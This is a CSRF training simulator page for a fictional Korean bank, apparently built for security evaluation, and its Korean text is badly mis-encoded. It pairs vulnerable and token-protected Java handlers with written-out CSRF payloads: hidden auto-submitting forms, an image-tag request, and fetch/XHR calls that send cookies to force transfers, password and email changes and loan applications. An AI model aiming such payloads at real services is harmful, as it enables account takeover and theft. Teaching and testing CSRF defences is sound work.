<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ê¸ˆìœµê¶Œ CSRF ì·¨ì•½ì  ì‹œë®¬ë ˆì´í„°</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700;900&display=swap');
        body { font-family: 'Noto Sans KR', sans-serif; }
        .code-font { font-family: 'Courier New', monospace; }
    </style>
</head>
<body class="bg-gray-100 p-4">

    <!-- í‰ê°€ê¸°ì¤€ ë°°ë„ˆ -->
    <div class="max-w-7xl mx-auto mb-4">
        <div class="bg-orange-600 text-white p-4 rounded-lg shadow-lg">
            <div class="flex items-center gap-3">
                <i class="fas fa-clipboard-check text-2xl"></i>
                <div>
                    <h1 class="font-bold text-lg">ì „ìê¸ˆìœµê¸°ë°˜ì‹œì„¤ ë³´ì•ˆ ì·¨ì•½ì  í‰ê°€ê¸°ì¤€ - WEB-SER-028</h1>
                    <p class="text-sm">í¬ë¡œìŠ¤ì‚¬ì´íŠ¸ ìš”ì²­ë³€ì¡° (CSRF) | ìœ„í—˜ë„: 4 (ë†’ìŒ) | í†µì œêµ¬ë¶„: 5.8.4 ì„œë¹„ìŠ¤ ë³´í˜¸</p>
                </div>
            </div>
        </div>
    </div>

    <!-- ë©”ì¸ ì»¨í…ì¸  -->
    <div class="max-w-7xl mx-auto">
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
            
            <!-- ì¢Œì¸¡: í”¼í•´ì ì€í–‰ ì‹œìŠ¤í…œ -->
            <div class="space-y-4">
                
                <!-- ì€í–‰ í—¤ë” -->
                <div class="bg-blue-600 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex items-center gap-3">
                        <i class="fas fa-building-columns text-2xl"></i>
                        <div>
                            <h2 class="text-xl font-bold">XXì€í–‰</h2>
                            <p class="text-sm">ì¸í„°ë„·ë±…í‚¹ - ë¡œê·¸ì¸ ìƒíƒœ</p>
                        </div>
                    </div>
                    <div class="mt-2 flex items-center gap-2">
                        <span class="bg-green-500 px-3 py-1 rounded text-sm">
                            <i class="fas fa-check-circle"></i> í™ê¸¸ë™ë‹˜ ë¡œê·¸ì¸ ì¤‘
                        </span>
                        <span class="bg-orange-500 px-3 py-1 rounded text-sm">
                            <i class="fas fa-exclamation-triangle"></i> ì·¨ì•½ì : CSRF í† í° ì—†ìŒ
                        </span>
                    </div>
                </div>

                <!-- ê³„ì¢Œ ì •ë³´ -->
                <div class="bg-white p-5 rounded-lg shadow-lg">
                    <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
                        <i class="fas fa-wallet text-blue-600"></i>
                        ë‚´ ê³„ì¢Œ
                    </h3>
                    
                    <div class="bg-gray-50 p-4 rounded-lg mb-4">
                        <p class="text-sm text-gray-600 mb-1">ì…ì¶œê¸ˆ í†µì¥</p>
                        <p class="text-lg font-bold">110-123-456789</p>
                        <div class="mt-3 flex items-baseline gap-2">
                            <span class="text-sm text-gray-600">ì”ì•¡:</span>
                            <span id="balance" class="text-3xl font-bold text-blue-600">5,000,000</span>
                            <span class="text-lg text-gray-600">ì›</span>
                        </div>
                    </div>

                    <div class="flex gap-2">
                        <button class="flex-1 bg-blue-600 text-white py-2 rounded hover:bg-blue-700">
                            <i class="fas fa-exchange-alt"></i> ì´ì²´
                        </button>
                        <button class="flex-1 bg-gray-600 text-white py-2 rounded hover:bg-gray-700">
                            <i class="fas fa-list"></i> ê±°ë˜ë‚´ì—­
                        </button>
                    </div>
                </div>

                <!-- í”¼ì‹± ì‚¬ì´íŠ¸ -->
                <div class="bg-gradient-to-br from-yellow-50 to-red-50 p-5 rounded-lg shadow-lg border-2 border-red-300">
                    <div class="bg-red-600 text-white px-2 py-1 rounded text-xs mb-3 inline-block">
                        <i class="fas fa-skull-crossbones"></i> ì•…ì„± í”¼ì‹± ì‚¬ì´íŠ¸
                    </div>
                    
                    <div class="text-center">
                        <div class="text-5xl mb-3">ğŸ</div>
                        <h3 class="font-bold text-xl text-red-600 mb-2">
                            ì¶•í•˜í•©ë‹ˆë‹¤! 100ë§Œì› ê²½í’ˆ ë‹¹ì²¨!
                        </h3>
                        <p class="text-sm text-gray-700 mb-4">
                            ì•„ë˜ ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ê²½í’ˆì„ ìˆ˜ë ¹í•˜ì„¸ìš”
                        </p>
                        
                        <button onclick="showMaliciousCode(1)" 
                                class="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg">
                            <i class="fas fa-gift"></i> ê²½í’ˆ ë°›ê¸°
                        </button>
                        
                        <div id="maliciousCode" class="mt-4 bg-gray-900 p-3 rounded code-font text-xs text-left text-green-400 hidden">
                            <div class="flex justify-between items-center mb-2">
                                <span class="text-gray-500">// ë²„íŠ¼ ë’¤ ìˆ¨ê²¨ì§„ ì‹¤ì œ ì•…ì„± ì½”ë“œ</span>
                                <span class="text-red-400 text-xs">ğŸš¨ ì‹¤í–‰ ì¤‘</span>
                            </div>
                            <pre id="maliciousCodeContent" class="text-yellow-400"></pre>
                        </div>
                    </div>
                </div>

                <!-- ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ë²„íŠ¼ -->
                <div class="bg-gray-800 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-flask text-orange-400"></i>
                        CSRF ê³µê²© ì‹œë‚˜ë¦¬ì˜¤
                    </h3>
                    <div class="space-y-2">
                        <button onclick="showMaliciousCode(1)" 
                                class="w-full text-left bg-red-900 hover:bg-red-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-money-bill-transfer"></i> ì‹œë‚˜ë¦¬ì˜¤ 1: ê³„ì¢Œ ì´ì²´ (ì „ì•¡ íƒˆì·¨)
                        </button>
                        <button onclick="showMaliciousCode(2)" 
                                class="w-full text-left bg-orange-900 hover:bg-orange-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-key"></i> ì‹œë‚˜ë¦¬ì˜¤ 2: ë¹„ë°€ë²ˆí˜¸ ë³€ê²½
                        </button>
                        <button onclick="showMaliciousCode(3)" 
                                class="w-full text-left bg-purple-900 hover:bg-purple-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-hand-holding-dollar"></i> ì‹œë‚˜ë¦¬ì˜¤ 3: ëŒ€ì¶œ ì‹ ì²­
                        </button>
                        <button onclick="showMaliciousCode(4)" 
                                class="w-full text-left bg-yellow-900 hover:bg-yellow-800 px-3 py-2 rounded text-sm">
                            <i class="fas fa-envelope"></i> ì‹œë‚˜ë¦¬ì˜¤ 4: ì´ë©”ì¼ ì£¼ì†Œ ë³€ê²½
                        </button>
                        <button onclick="resetSimulation()" 
                                class="w-full text-left bg-gray-600 hover:bg-gray-500 px-3 py-2 rounded text-sm mt-4">
                            <i class="fas fa-redo"></i> ë¦¬ì…‹ (ì‹œë®¬ë ˆì´ì…˜ ì´ˆê¸°í™”)
                        </button>
                    </div>
                </div>

                <!-- ì‹¤ì œ ì•…ì„± ì½”ë“œ ì˜ˆì‹œ -->
                <div id="realAttackCode" class="hidden bg-red-900 text-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-2 flex items-center gap-2">
                        <i class="fas fa-code"></i> ì‹¤ì œ ì‚¬ìš©ë˜ëŠ” CSRF ê³µê²© ì½”ë“œ
                    </h3>
                    <div class="text-xs mb-2">
                        <span class="bg-red-700 px-2 py-1 rounded">í˜„ì¬ ì‹œë‚˜ë¦¬ì˜¤: <span id="currentScenario"></span></span>
                    </div>
                    <pre id="realCodeContent" class="code-font text-xs bg-black p-3 rounded overflow-auto max-h-[250px] text-green-400"></pre>
                </div>

                <!-- ì·¨ì•½í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-red-400">
                            <i class="fas fa-skull-crossbones"></i> ì·¨ì•½í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-red-600 px-2 py-1 rounded">ìœ„í—˜</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto"><code><span class="text-gray-500">// âŒ ì·¨ì•½í•œ ì½”ë“œ - CSRF í† í° ê²€ì¦ ì—†ìŒ</span>
@PostMapping("/transfer")
public String transfer(
    @RequestParam String toAccount,
    @RequestParam Long amount,
    HttpSession session) {
    
    <span class="text-red-400">// ì„¸ì…˜ë§Œ í™•ì¸ (CSRF í† í° ì—†ìŒ!)</span>
    User user = (User) session.getAttribute("user");
    if (user == null) {
        return "redirect:/login";
    }
    
    <span class="text-red-400">// CSRF í† í° ê²€ì¦ ì—†ì´ ë°”ë¡œ ì´ì²´ ì‹¤í–‰</span>
    bankService.transfer(
        user.getAccount(),
        toAccount,
        amount
    );
    
    return "transfer_success";
}</code></pre>
                </div>

            </div>

            <!-- ìš°ì¸¡: ê²°ê³¼ ë° ì•ˆì „í•œ ì½”ë“œ -->
            <div class="space-y-4">
                
                <!-- ì„œë²„ ë¡œê·¸ -->
                <div class="bg-white rounded-lg shadow-lg overflow-hidden">
                    <div class="bg-gray-800 text-white px-4 py-3 flex justify-between items-center">
                        <h3 class="font-bold">
                            <i class="fas fa-terminal"></i> ì€í–‰ ì„œë²„ ë¡œê·¸
                        </h3>
                        <span id="statusBadge" class="text-xs bg-green-500 text-gray-900 px-3 py-1 rounded code-font">
                            SECURE
                        </span>
                    </div>
                    <div id="serverLog" class="p-5 min-h-[250px] bg-gray-900 text-green-400 code-font text-xs space-y-1 overflow-auto">
                        <div class="text-gray-500">[SERVER] Banking system ready...</div>
                        <div class="text-gray-500">[SESSION] User í™ê¸¸ë™ logged in</div>
                    </div>
                </div>

                <!-- ê³µê²© ì„±ê³µ ì•Œë¦¼ -->
                <div id="attackSuccess" class="hidden bg-red-100 border-l-4 border-red-600 p-4 rounded-lg">
                    <h4 class="font-bold text-red-700 mb-2 flex items-center gap-2">
                        <i class="fas fa-exclamation-triangle"></i> CSRF ê³µê²© ì„±ê³µ!
                    </h4>
                    <div id="attackDetails" class="text-sm text-red-700"></div>
                </div>

                <!-- ê³µê²© ë‹¨ê³„ -->
                <div id="attackStages" class="hidden bg-orange-100 border-l-4 border-orange-600 p-4 rounded-lg">
                    <h4 class="font-bold text-orange-700 mb-2 flex items-center gap-2">
                        <i class="fas fa-list-ol"></i> ê³µê²© ì§„í–‰ ë‹¨ê³„
                    </h4>
                    <div id="stagesContent" class="text-sm text-orange-700 space-y-1"></div>
                </div>

                <!-- ì•ˆì „í•œ ì½”ë“œ -->
                <div class="bg-gray-900 text-white p-4 rounded-lg shadow-lg">
                    <div class="flex justify-between items-center mb-3">
                        <h3 class="font-bold text-green-400">
                            <i class="fas fa-shield-halved"></i> ì•ˆì „í•œ Java ì½”ë“œ
                        </h3>
                        <span class="text-xs bg-green-600 px-2 py-1 rounded">ê¶Œì¥</span>
                    </div>
                    <pre class="code-font text-xs overflow-x-auto max-h-[500px]"><code><span class="text-green-400">// âœ… ì•ˆì „í•œ ì½”ë“œ - CSRF í† í° ê²€ì¦</span>
@PostMapping("/transfer")
public String transfer(
    @RequestParam String toAccount,
    @RequestParam Long amount,
    @RequestParam String csrfToken,
    HttpSession session) {
    
    <span class="text-green-400">// 1. ì„¸ì…˜ í™•ì¸</span>
    User user = (User) session.getAttribute("user");
    if (user == null) {
        return "redirect:/login";
    }
    
    <span class="text-green-400">// 2. CSRF í† í° ê²€ì¦ (í•„ìˆ˜!)</span>
    String sessionToken = 
        (String) session.getAttribute("csrfToken");
    
    if (sessionToken == null || 
        !sessionToken.equals(csrfToken)) {
        throw new SecurityException(
            "CSRF token validation failed"
        );
    }
    
    <span class="text-green-400">// 3. ì¶”ê°€ ê²€ì¦: Referer í™•ì¸</span>
    String referer = request.getHeader("Referer");
    if (referer == null || 
        !referer.startsWith("https://xxbank.com")) {
        throw new SecurityException(
            "Invalid referer"
        );
    }
    
    <span class="text-green-400">// 4. ì´ì²´ ì‹¤í–‰</span>
    bankService.transfer(
        user.getAccount(),
        toAccount,
        amount
    );
    
    <span class="text-green-400">// 5. í† í° ì¬ìƒì„± (One-time use)</span>
    String newToken = generateCSRFToken();
    session.setAttribute("csrfToken", newToken);
    
    return "transfer_success";
}

<span class="text-green-400">// CSRF í† í° ìƒì„±</span>
private String generateCSRFToken() {
    return UUID.randomUUID().toString();
}

<span class="text-green-400">// Spring Security ì„¤ì •</span>
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(
            HttpSecurity http) throws Exception {
        
        http
            <span class="text-green-400">// CSRF ë³´í˜¸ í™œì„±í™”</span>
            .csrf(csrf -> csrf
                .csrfTokenRepository(
                    CookieCsrfTokenRepository
                        .withHttpOnlyFalse()
                )
            )
            
            <span class="text-green-400">// SameSite ì¿ í‚¤ ì„¤ì •</span>
            .sessionManagement(session -> session
                .sessionCreationPolicy(
                    SessionCreationPolicy.IF_REQUIRED
                )
            );
        
        return http.build();
    }
}

<span class="text-green-400">// JSP/Thymeleafì—ì„œ í† í° ì‚¬ìš©</span>
<span class="text-gray-500">&lt;!-- JSP --&gt;</span>
&lt;form action="/transfer" method="post"&gt;
    &lt;input type="hidden" 
           name="csrfToken" 
           value="${csrfToken}"/&gt;
    &lt;!-- í¼ í•„ë“œ --&gt;
&lt;/form&gt;

<span class="text-gray-500">&lt;!-- Thymeleaf --&gt;</span>
&lt;form th:action="@{/transfer}" method="post"&gt;
    &lt;input type="hidden" 
           th:name="${_csrf.parameterName}" 
           th:value="${_csrf.token}"/&gt;
    &lt;!-- í¼ í•„ë“œ --&gt;
&lt;/form&gt;

<span class="text-green-400">// Double Submit Cookie íŒ¨í„´</span>
@PostMapping("/transfer")
public String transfer(
    @CookieValue("XSRF-TOKEN") String cookieToken,
    @RequestParam("_csrf") String formToken,
    HttpSession session) {
    
    <span class="text-green-400">// ì¿ í‚¤ í† í°ê³¼ í¼ í† í° ë¹„êµ</span>
    if (!cookieToken.equals(formToken)) {
        throw new SecurityException(
            "CSRF token mismatch"
        );
    }
    
    // ê³„ì† ì²˜ë¦¬...
}</code></pre>
                </div>

                <!-- ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸ -->
                <div class="bg-white p-4 rounded-lg shadow-lg">
                    <h3 class="font-bold mb-3 flex items-center gap-2">
                        <i class="fas fa-list-check text-orange-600"></i>
                        CSRF ë°©ì–´ ì²´í¬ë¦¬ìŠ¤íŠ¸
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>CSRF í† í°:</strong> ëª¨ë“  ìƒíƒœ ë³€ê²½ ìš”ì²­ì— í† í° ê²€ì¦</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>SameSite ì¿ í‚¤:</strong> Strict ë˜ëŠ” Lax ì„¤ì •</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>Referer ê²€ì¦:</strong> ìš”ì²­ ì¶œì²˜ í™•ì¸</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>í† í° ì¬ìƒì„±:</strong> ì‚¬ìš© í›„ í† í° ë¬´íš¨í™”</div>
                        </div>
                        <div class="flex items-start gap-2">
                            <i class="fas fa-check text-green-500 mt-1"></i>
                            <div><strong>Custom Header:</strong> X-Requested-With í™•ì¸</div>
                        </div>
                    </div>
                </div>

                <!-- í‰ê°€ íŒì • -->
                <div id="judgementBox" class="hidden bg-gray-900 text-white p-4 rounded-lg">
                    <h3 class="font-bold text-indigo-400 mb-2 text-sm">
                        <i class="fas fa-gavel"></i> í‰ê°€ íŒì •
                    </h3>
                    <div class="text-xs space-y-1">
                        <div><strong>í‰ê°€í•­ëª©:</strong> WEB-SER-028 CSRF</div>
                        <div><strong>íŒì •:</strong> <span id="judgement"></span></div>
                        <div><strong>ê·¼ê±°:</strong> <span id="evidence"></span></div>
                    </div>
                </div>

                <!-- í”¼í•´ ì‹œë‚˜ë¦¬ì˜¤ -->
                <div id="damageBox" class="hidden bg-orange-700 text-white p-4 rounded-lg">
                    <h3 class="font-bold mb-3">
                        <i class="fas fa-fire"></i> ê¸ˆìœµê¶Œ CSRF í”¼í•´
                    </h3>
                    <div class="space-y-2 text-sm">
                        <div class="flex gap-2">
                            <span class="font-bold">1.</span>
                            <div><strong>ë¬´ë‹¨ ê³„ì¢Œì´ì²´</strong><br>í”¼í•´ì ê³„ì¢Œì—ì„œ ìë™ ì†¡ê¸ˆ</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">2.</span>
                            <div><strong>ë¹„ë°€ë²ˆí˜¸ ë³€ê²½</strong><br>ê³„ì • ì ‘ê·¼ ê¶Œí•œ íƒˆì·¨</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">3.</span>
                            <div><strong>ë¬´ë‹¨ ëŒ€ì¶œ ì‹ ì²­</strong><br>í”¼í•´ì ëª…ì˜ ëŒ€ì¶œ ì‹¤í–‰</div>
                        </div>
                        <div class="flex gap-2">
                            <span class="font-bold">4.</span>
                            <div><strong>ì—°ë½ì²˜ ë³€ê²½</strong><br>2ì°¨ ì¸ì¦ ìš°íšŒ</div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        let currentScenario = 0;

        function showMaliciousCode(scenario) {
            currentScenario = scenario;
            
            // ì•…ì„± ì½”ë“œ í‘œì‹œ
            document.getElementById('maliciousCode').classList.remove('hidden');
            document.getElementById('realAttackCode').classList.remove('hidden');
            
            let scenarioName = '';
            let maliciousHTML = '';
            let realCode = '';
            
            if (scenario === 1) {
                scenarioName = 'ê³„ì¢Œ ì´ì²´ ê³µê²©';
                maliciousHTML = `<span class="text-yellow-400">// ìë™ ì œì¶œ í¼ (ì‚¬ìš©ì ëª°ë˜)</span>
&lt;form id="csrfForm" 
      action="https://xxbank.com/api/transfer" 
      method="POST"&gt;
  &lt;input name="toAccount" value="999-888-777777"/&gt;
  &lt;input name="amount" value="5000000"/&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById('csrfForm').submit();
&lt;/script&gt;`;

                realCode = `<span class="text-gray-500">/* í”¼ì‹± ì‚¬ì´íŠ¸ì— ì‹¤ì œ ì‚½ì…ë˜ëŠ” HTML/JS ì½”ë“œ */</span>

<span class="text-yellow-400">&lt;!-- ë°©ë²• 1: ìë™ ì œì¶œ í¼ --&gt;</span>
&lt;form id="attackForm" 
      action="https://xxbank.com/api/transfer" 
      method="POST"
      style="display:none"&gt;
  &lt;input name="toAccount" value="999-888-777777"/&gt;
  &lt;input name="amount" value="5000000"/&gt;
&lt;/form&gt;
&lt;script&gt;
  window.onload = function() {
    document.getElementById('attackForm').submit();
  };
&lt;/script&gt;

<span class="text-yellow-400">&lt;!-- ë°©ë²• 2: ì´ë¯¸ì§€ íƒœê·¸ ì´ìš© --&gt;</span>
&lt;img src="https://xxbank.com/api/transfer?toAccount=999-888-777777&amount=5000000" 
     style="display:none"/&gt;

<span class="text-yellow-400">&lt;!-- ë°©ë²• 3: Fetch API --&gt;</span>
&lt;script&gt;
  fetch('https://xxbank.com/api/transfer', {
    method: 'POST',
    credentials: 'include',  // ì¿ í‚¤ í¬í•¨!
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      toAccount: '999-888-777777',
      amount: 5000000
    })
  });
&lt;/script&gt;`;
                
            } else if (scenario === 2) {
                scenarioName = 'ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ê³µê²©';
                maliciousHTML = `<span class="text-yellow-400">// ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ìš”ì²­</span>
&lt;form action="https://xxbank.com/change-password" 
      method="POST"&gt;
  &lt;input name="newPassword" value="hacker123!@#"/&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;`;

                realCode = `<span class="text-gray-500">/* ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ CSRF ê³µê²© */</span>

<span class="text-yellow-400">&lt;!-- ìˆ¨ê²¨ì§„ í¼ìœ¼ë¡œ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ --&gt;</span>
&lt;form id="pwdChange" 
      action="https://xxbank.com/api/change-password" 
      method="POST"&gt;
  &lt;input name="newPassword" value="hacker123!@#"/&gt;
  &lt;input name="confirmPassword" value="hacker123!@#"/&gt;
&lt;/form&gt;
&lt;script&gt;
  setTimeout(function() {
    document.getElementById('pwdChange').submit();
  }, 1000);  // 1ì´ˆ í›„ ìë™ ì‹¤í–‰
&lt;/script&gt;

<span class="text-yellow-400">&lt;!-- AJAX ë°©ì‹ --&gt;</span>
&lt;script&gt;
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'https://xxbank.com/api/change-password');
  xhr.withCredentials = true;  // ì¿ í‚¤ í¬í•¨
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send('newPassword=hacker123!@#&confirmPassword=hacker123!@#');
&lt;/script&gt;`;
                
            } else if (scenario === 3) {
                scenarioName = 'ëŒ€ì¶œ ì‹ ì²­ ê³µê²©';
                maliciousHTML = `<span class="text-yellow-400">// ëŒ€ì¶œ ì‹ ì²­ (5ì²œë§Œì›)</span>
&lt;form action="https://xxbank.com/loan/apply" 
      method="POST"&gt;
  &lt;input name="amount" value="50000000"/&gt;
  &lt;input name="period" value="60"/&gt;
  &lt;input name="targetAccount" value="í•´ì»¤ê³„ì¢Œ"/&gt;
&lt;/form&gt;`;

                realCode = `<span class="text-gray-500">/* ë¬´ë‹¨ ëŒ€ì¶œ ì‹ ì²­ CSRF ê³µê²© */</span>

<span class="text-yellow-400">&lt;!-- í”¼í•´ì ëª…ì˜ë¡œ ëŒ€ì¶œ ì‹ ì²­ --&gt;</span>
&lt;iframe name="hiddenFrame" style="display:none"&gt;&lt;/iframe&gt;
&lt;form id="loanForm" 
      action="https://xxbank.com/api/loan/apply" 
      method="POST"
      target="hiddenFrame"&gt;
  &lt;input name="amount" value="50000000"/&gt;
  &lt;input name="period" value="60"/&gt;
  &lt;input name="purpose" value="ìƒí™œìê¸ˆ"/&gt;
  &lt;input name="depositAccount" value="999-888-777777"/&gt;
&lt;/form&gt;
&lt;script&gt;
  document.getElementById('loanForm').submit();
&lt;/script&gt;

<span class="text-yellow-400">&lt;!-- ê²°ê³¼ë¥¼ ìˆ¨ê¸°ê¸° ìœ„í•´ iframe ì‚¬ìš© --&gt;</span>
<span class="text-gray-500">// ì‚¬ìš©ìëŠ” ëŒ€ì¶œ ì‹ ì²­ëœ ê²ƒì„ ë°”ë¡œ ì•Œì§€ ëª»í•¨</span>`;
                
            } else if (scenario === 4) {
                scenarioName = 'ì´ë©”ì¼ ë³€ê²½ ê³µê²©';
                maliciousHTML = `<span class="text-yellow-400">// ì´ë©”ì¼ ì£¼ì†Œ ë³€ê²½</span>
&lt;form action="https://xxbank.com/profile/email" 
      method="POST"&gt;
  &lt;input name="email" value="hacker@evil.com"/&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;`;

                realCode = `<span class="text-gray-500">/* ì´ë©”ì¼ ë³€ê²½ìœ¼ë¡œ 2ì°¨ ì¸ì¦ ìš°íšŒ */</span>

<span class="text-yellow-400">&lt;!-- ì´ë©”ì¼ ì£¼ì†Œë¥¼ í•´ì»¤ ì´ë©”ì¼ë¡œ ë³€ê²½ --&gt;</span>
&lt;form id="emailChange" 
      action="https://xxbank.com/api/profile/email" 
      method="POST"&gt;
  &lt;input name="email" value="hacker@evil.com"/&gt;
&lt;/form&gt;
&lt;script&gt;
  <span class="text-gray-500">// ë²„íŠ¼ í´ë¦­ ì‹œ ì‹¤í–‰</span>
  document.querySelector('button').addEventListener('click', function() {
    document.getElementById('emailChange').submit();
  });
&lt;/script&gt;

<span class="text-yellow-400">&lt;!-- ì´í›„ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ --&gt;</span>
<span class="text-gray-500">// 1. ì´ë©”ì¼ì´ í•´ì»¤ ì´ë©”ì¼ë¡œ ë³€ê²½ë¨
// 2. í•´ì»¤ê°€ "ë¹„ë°€ë²ˆí˜¸ ì°¾ê¸°" ìš”ì²­
// 3. ì¬ì„¤ì • ë§í¬ê°€ í•´ì»¤ ì´ë©”ì¼ë¡œ ì „ì†¡
// 4. í•´ì»¤ê°€ ê³„ì • ì™„ì „ ì¥ì•…</span>`;
            }
            
            document.getElementById('maliciousCodeContent').innerHTML = maliciousHTML;
            document.getElementById('currentScenario').textContent = scenarioName;
            document.getElementById('realCodeContent').innerHTML = realCode;
            
            // ì‹¤ì œ ê³µê²© ì‹¤í–‰
            setTimeout(function() {
                triggerCSRF(scenario);
            }, 1000);
        }

        function resetSimulation() {
            currentScenario = 0;
            
            // ì”ì•¡ ë³µêµ¬
            document.getElementById('balance').textContent = '5,000,000';
            document.getElementById('balance').className = 'text-3xl font-bold text-blue-600';
            
            // ë¡œê·¸ ì´ˆê¸°í™”
            document.getElementById('serverLog').innerHTML = 
                '<div class="text-gray-500">[SERVER] Banking system ready...</div>' +
                '<div class="text-gray-500">[SESSION] User í™ê¸¸ë™ logged in</div>';
            
            // ìƒíƒœ ë°°ì§€ ì´ˆê¸°í™”
            document.getElementById('statusBadge').textContent = 'SECURE';
            document.getElementById('statusBadge').className = 'text-xs bg-green-500 text-gray-900 px-3 py-1 rounded code-font';
            
            // ìˆ¨ê¸°ê¸°
            document.getElementById('maliciousCode').classList.add('hidden');
            document.getElementById('realAttackCode').classList.add('hidden');
            document.getElementById('attackSuccess').classList.add('hidden');
            document.getElementById('attackStages').classList.add('hidden');
            document.getElementById('judgementBox').classList.add('hidden');
            document.getElementById('damageBox').classList.add('hidden');
        }

        function resetBalance() {
            document.getElementById('balance').textContent = '5,000,000';
            document.getElementById('balance').className = 'text-3xl font-bold text-blue-600';
        }

        async function triggerCSRF(scenario) {
            var logBox = document.getElementById('serverLog');
            var badge = document.getElementById('statusBadge');
            
            document.getElementById('attackSuccess').classList.add('hidden');
            document.getElementById('attackStages').classList.add('hidden');
            document.getElementById('judgementBox').classList.add('hidden');
            document.getElementById('damageBox').classList.add('hidden');

            badge.textContent = 'ATTACKING...';
            badge.className = 'text-xs bg-red-500 text-white px-3 py-1 rounded code-font animate-pulse';
            
            addLog('[ATTACK] Malicious code executed on phishing site', 'text-red-400');
            await sleep(500);
            addLog('[REQUEST] Forged request sent to bank server', 'text-yellow-400');
            await sleep(500);
            addLog('[COOKIE] Session cookie automatically included', 'text-orange-400');
            await sleep(500);

            if (scenario === 1) {
                // ê³„ì¢Œ ì´ì²´
                addLog('[POST] https://xxbank.com/api/transfer', 'text-blue-400');
                await sleep(300);
                addLog('[PAYLOAD] toAccount=999-888-777777, amount=5000000', 'text-gray-400');
                await sleep(300);
                addLog('[VALIDATION] Session check: PASS âœ“', 'text-green-400');
                await sleep(300);
                addLog('[VALIDATION] CSRF token check: SKIPPED âœ—', 'text-red-400');
                await sleep(500);
                addLog('[DANGER] Transfer executed without CSRF protection!', 'text-red-500 font-bold');
                await sleep(500);
                addLog('[RESULT] â‚©5,000,000 transferred to hacker account', 'text-red-500 font-bold');
                
                document.getElementById('balance').textContent = '0';
                document.getElementById('balance').className = 'text-3xl font-bold text-red-600 animate-pulse';
                
                document.getElementById('attackSuccess').classList.remove('hidden');
                document.getElementById('attackDetails').innerHTML = 
                    '<strong>âœ“ ê³µê²© ì„±ê³µ!</strong><br>' +
                    'í”¼í•´ì ê³„ì¢Œì—ì„œ <strong class="text-xl">â‚©5,000,000</strong>ì´ í•´ì»¤ ê³„ì¢Œ(999-888-777777)ë¡œ ì´ì²´ë˜ì—ˆìŠµë‹ˆë‹¤.<br>' +
                    '<span class="text-xs mt-2 block">í”¼í•´ìëŠ” í”¼ì‹± ì‚¬ì´íŠ¸ì˜ ë²„íŠ¼ì„ í´ë¦­í–ˆì„ ë¿, ì´ì²´ ì˜ì‚¬ê°€ ì—†ì—ˆìŠµë‹ˆë‹¤.</span>';
                
                document.getElementById('attackStages').classList.remove('hidden');
                document.getElementById('stagesContent').innerHTML = 
                    '<div><strong>1ë‹¨ê³„:</strong> í”¼í•´ìê°€ ì€í–‰ì— ë¡œê·¸ì¸ (ì„¸ì…˜ ì¿ í‚¤ ë°œê¸‰)</div>' +
                    '<div><strong>2ë‹¨ê³„:</strong> í”¼í•´ìê°€ í”¼ì‹± ì‚¬ì´íŠ¸ ì ‘ì†</div>' +
                    '<div><strong>3ë‹¨ê³„:</strong> "ê²½í’ˆ ë°›ê¸°" ë²„íŠ¼ í´ë¦­</div>' +
                    '<div><strong>4ë‹¨ê³„:</strong> ìˆ¨ê²¨ì§„ í¼ì´ ì€í–‰ APIë¡œ POST ìš”ì²­</div>' +
                    '<div><strong>5ë‹¨ê³„:</strong> ë¸Œë¼ìš°ì €ê°€ ìë™ìœ¼ë¡œ ì„¸ì…˜ ì¿ í‚¤ í¬í•¨</div>' +
                    '<div><strong>6ë‹¨ê³„:</strong> ì€í–‰ ì„œë²„ê°€ ì„¸ì…˜ë§Œ í™•ì¸ (CSRF í† í° ì—†ìŒ)</div>' +
                    '<div><strong>7ë‹¨ê³„:</strong> ì´ì²´ ì‹¤í–‰ ì™„ë£Œ</div>';
                
            } else if (scenario === 2) {
                // ë¹„ë°€ë²ˆí˜¸ ë³€ê²½
